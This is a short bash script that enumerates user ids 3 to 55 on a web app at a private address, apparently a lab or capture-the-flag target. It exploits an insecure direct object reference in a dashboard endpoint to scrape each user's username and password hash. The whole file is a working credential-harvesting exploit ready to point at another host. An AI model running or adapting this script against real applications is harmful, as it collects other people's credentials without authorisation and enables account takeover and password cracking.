#!/bin/bash

MAX_USERS=55

for id in $(seq 3 $MAX_USERS); do

   username=$(curl -s "http://172.17.0.2:5000/dashboard?id=$id" | grep '<span class="info-value">' | head -n 1 | sed 's/<span class="info-value">//' | sed 's/<\/span>//' | sed 's/ //g')
   password=$(curl -s "http://172.17.0.2:5000/dashboard?id=$id" | grep '<div class="password-hash">' | sed 's/<div class="password-hash">//' | sed 's/<\/div>//' | sed 's/ //g')

  echo "$username:$password";

done
